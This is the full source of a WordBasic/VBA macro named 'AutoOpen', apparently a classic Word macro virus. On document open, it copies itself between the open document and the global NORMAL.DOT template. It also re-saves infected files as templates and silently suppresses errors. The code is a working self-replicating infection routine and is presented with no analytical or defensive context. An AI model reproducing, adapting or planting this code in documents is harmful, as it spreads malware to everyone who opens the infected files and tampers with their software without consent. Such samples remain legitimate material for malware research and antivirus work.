   Attribute VB_Name = "AutoOpen"
   Public Sub MAIN()
   Dim F$
   Dim M$
   On Error GoTo -1: On Error GoTo MinSize
   F$ = WordBasic.[FileName$]() + ":AutoOpen"
   M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If M$ = "NORMAL.DOT" Then
   WordBasic.MacroCopy "Global:AutoOpen", F$
   WordBasic.FileSaveAs Format:=1
   Else
   WordBasic.MacroCopy F$, "Global:AutoOpen"
   End If
   MinSize:
   End Sub
